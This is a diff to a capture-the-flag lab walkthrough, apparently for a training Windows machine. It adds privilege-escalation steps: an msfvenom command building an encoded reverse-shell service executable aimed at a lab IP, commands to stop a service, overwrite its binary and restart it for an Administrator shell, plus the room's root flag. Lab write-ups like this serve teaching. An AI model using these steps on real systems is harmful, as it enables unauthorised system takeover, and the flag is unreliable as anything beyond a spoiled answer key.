@@ -22,7 +22,7 @@ Deploy the machine.
 
     ![task1-image](./images/task1-image.png)
 
-## Task 2 - Initial Access 
+## Task 2 - Initial Access
 
 Now you have deployed the machine, lets get an initial shell!
 
@@ -86,7 +86,7 @@ Now you have deployed the machine, lets get an initial shell!
 
         ![task2-flag](./images/task2-flag.png)
 
-## Task 3 - Privilege Escalation 
+## Task 3 - Privilege Escalation
 
 Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!
 
@@ -104,17 +104,69 @@ To execute this using Meterpreter, I will type load powershell into meterpreter.
 
 * Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
 
+    `AdvancedSystemCareService9`
+
+    ![task3-servicename](./images/task3-servicename.png)
+
 The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
 
 Use msfvenom to generate a reverse shell as an Windows executable.
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.52.88 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
 
+![task3-msfvenom](./images/task3-msfvenom.png)
+
 Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
 
-Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
+![task3-upload](./images/task3-upload.png)
+
+* **Note**: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
+
+    * Run Windows shell
+    
+        ```
+        shell
+        ```
+
+        ![task3-shell](./images/task3-shell.png)
+    
+    * Stop service
+    
+        ```
+        sc stop AdvancedSystemCareService9
+        ```
+
+        ![task3-stop-service](./images/task3-stop-service.png)
+
+    * Copy file upload to the directory original service
+    
+        ```
+        copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+        ```
+
+        ![task3-copy](./images/task3-copy.png)
+
+    * Setup nc listener on out machine
+    
+        ![task3-listener](./images/task3-listener.png)
+
+    * Then restart the program
+        
+        ```
+        sc start AdvancedSystemCareService9
+        ```
+
+        ![task3-start-service](./images/task3-start-service.png)
+
+    * Get a shell as Administrator
+    
+        ![task3-admin](./images/task3-admin.png)
 
 * What is the root flag?
+
+    `9af5f314f57607c00fd09803a587db80`
+
+    ![task3-root](./images/task3-root.png)
 
 ## Task 4 - Access and Escalation Without Metasploit
 
